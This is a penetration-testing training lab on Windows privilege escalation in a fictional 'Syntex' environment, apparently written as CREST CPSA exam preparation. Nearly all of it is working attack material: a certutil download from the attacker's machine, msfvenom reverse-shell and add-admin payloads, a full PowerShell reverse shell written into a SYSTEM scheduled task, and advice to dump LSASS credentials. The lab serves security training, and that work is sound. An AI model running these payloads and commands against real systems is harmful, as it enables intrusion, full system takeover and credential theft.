Lab E3-A: Windows Privilege Escalation

Module E Windows CREST CPSA Syntex Solutions Ltd Difficulty: Intermediate Estimated time: 75 min

Engagement Scenario

You have a low-privilege shell on SYNTEX-DC01 as jsmith (a standard domain user). Your objective is to escalate to SYSTEM or local Administrator using misconfigurations identified during WinPEAS enumeration. The Syntex lab contains three distinct privilege escalation paths - work through each one.

Learning Objectives

  • Run WinPEAS and interpret the output to identify escalation vectors
  • Exploit an unquoted service path to execute code as SYSTEM
  • Abuse AlwaysInstallElevated to install a malicious MSI as SYSTEM
  • Hijack a world-writable scheduled task script

Automated Enumeration with WinPEAS

WinPEAS

WinPEAS is the Windows equivalent of LinPEAS. It automates local privilege escalation enumeration and highlights findings in colour. Transfer it to the target and run it:

# On Kali: serve WinPEAS over HTTP
python3 -m http.server 8080

# On the target (Evil-WinRM shell or cmd):
certutil -urlcache -split -f http://<KALI-IP>:8080/winPEASx64.exe winpeas.exe
.\winpeas.exe

WinPEAS output is long. The key sections to focus on for CPSA-level findings:

# Watch for these in the output:
[+] Unquoted Service Paths
[+] AlwaysInstallElevated
[+] Modifiable Services
[+] Scheduled Tasks Writeable

Unquoted Path

SyntexBackup service - binary path has spaces and no quotes

AlwaysInstallElevated

Both HKCU and HKLM keys set to 1 - any user can install MSI as SYSTEM

Weak ACL Service

SyntexMonitor binary is writable by authenticated users

Scheduled Task

SyntexMaintenance task script is world-writable

★
CREST CPSA Exam Point: WinPEAS is a tool you should know inside out for CPSA. The exam may ask you to identify which WinPEAS finding represents a specific vulnerability class, or which technique the highlighted output corresponds to. Always read the full output before choosing a path.

Unquoted Service Path: SyntexBackup

Unquoted Path

Verify the vulnerable service manually. An unquoted path with spaces means Windows will attempt to execute each space-separated segment as a binary path:

# Check service binary path
sc qc SyntexBackup

SERVICE_NAME: SyntexBackup
  BINARY_PATH_NAME   : C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe

# Windows will try these paths in order:
# C:\Program.exe
# C:\Program Files\Syntex.exe   <-- THIS is the attack vector
# C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe

Check write permissions on C:\Program Files\:

# PowerShell - check ACL on the directory
icacls "C:\Program Files\Syntex Solutions"

C:\Program Files\Syntex Solutions BUILTIN\Users:(OI)(CI)(W)
# (W) means write access for all authenticated users - vulnerable!

Generate a malicious executable with msfvenom and plant it at the path Windows will search first:

# On Kali: generate a reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=4444 -f exe -o Syntex.exe

# Transfer Syntex.exe to target and place it in the vulnerable path
# (via Evil-WinRM upload or certutil)
copy Syntex.exe "C:\Program Files\Syntex Solutions\Syntex.exe"

# On Kali: set up listener
nc -lvnp 4444

# Restart the service (requires service control permission or wait for reboot)
sc stop SyntexBackup
sc start SyntexBackup

# Catch the SYSTEM shell on Kali
connect to [KALI-IP] from (UNKNOWN) [<DC01-IP>]
Microsoft Windows [Version 10.0.14393]
C:\Windows\system32>whoami
nt authority\system

AlwaysInstallElevated: MSI Abuse

Registry Misconfiguration

Verify both registry keys are set to 1 (both HKCU and HKLM must be set for this to be exploitable):

# Check both registry keys - both must equal 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

Generate a malicious MSI that adds a new local administrator:

# On Kali: generate a malicious MSI payload
msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o evil.msi

# Or use a reverse shell payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=4445 -f msi -o evil.msi

# Transfer evil.msi to target, then install it
# The installation runs as SYSTEM due to the policy setting
msiexec /quiet /qn /i evil.msi
★
CREST CPSA Exam Point: AlwaysInstallElevated is a Group Policy setting that allows any user to install MSI packages with SYSTEM privileges. It is a HIGH finding because it is trivially exploitable - any domain user with network access can escalate to SYSTEM without any vulnerability in the application software.

Scheduled Task Script Hijacking: SyntexMaintenance

Scheduled Tasks

WinPEAS flagged a world-writable scheduled task script. Verify the task and its script path:

# List the task configuration
schtasks /query /tn "SyntexMaintenance" /fo LIST /v

TaskName:                             \SyntexMaintenance
Run As User:                          SYSTEM
Task To Run:                          C:\Scripts\maintenance.ps1
Schedule Type:                        Daily
Start Time:                           02:00:00

Check write permissions on the script file:

icacls C:\Scripts\maintenance.ps1
C:\Scripts\maintenance.ps1 Everyone:(F)
# (F) = Full Control for Everyone - world-writable!

Overwrite the script with a reverse shell payload:

# Write a PowerShell reverse shell into the task script
$cmd = '$client = New-Object System.Net.Sockets.TCPClient("<KALI-IP>",4446);'
$cmd += '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'
$cmd += 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'
$cmd += '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
$cmd += '$sendback = (iex $data 2>&1 | Out-String);'
$cmd += '$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
$cmd += '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
$cmd += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}'
Set-Content C:\Scripts\maintenance.ps1 $cmd

# Set up listener on Kali and wait for the task to execute (or trigger manually if you have rights)
# nc -lvnp 4446
⚠
Persistence Note: In a real engagement, overwriting a scheduled task script is a destructive action - you are replacing legitimate business logic. Always take a backup of the original file first and restore it after demonstrating the vulnerability. Document this clearly in your report.

Knowledge Check

Q1. A service has the binary path: C:\Program Files\My App\Service Files\svc.exe. Which path will Windows try to execute first due to the unquoted path vulnerability?

A. C:\Program.exe
B. C:\Program Files\My.exe
C. C:\Program Files\My App\Service.exe
D. C:\Program Files\My App\Service Files\svc.exe

Q2. For AlwaysInstallElevated to be exploitable, what condition must be true?

Both the HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated AND HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated registry values must be set to 1. If only one is set, the policy does not apply and MSI packages are not automatically elevated.

Q3. You have escalated to SYSTEM via an unquoted service path. What should you do immediately after achieving SYSTEM?

A. Run WinPEAS again to find more vulnerabilities
B. Dump LSASS with Mimikatz to extract all credentials in memory
C. Install persistence via a new registry run key
D. Map network shares from the SYSTEM context

Key Takeaways

  • WinPEAS is the starting point for every Windows privesc engagement - read all of it before choosing a path
  • Unquoted paths exploit Windows path resolution order - place a binary where Windows will find it first
  • AlwaysInstallElevated is trivially exploitable - one msfvenom MSI gets you SYSTEM regardless of patching
  • World-writable scheduled task scripts that run as SYSTEM are equivalent to a SYSTEM shell waiting to happen
  • After reaching SYSTEM, immediately dump LSASS - every credential in memory is your next lateral movement opportunity
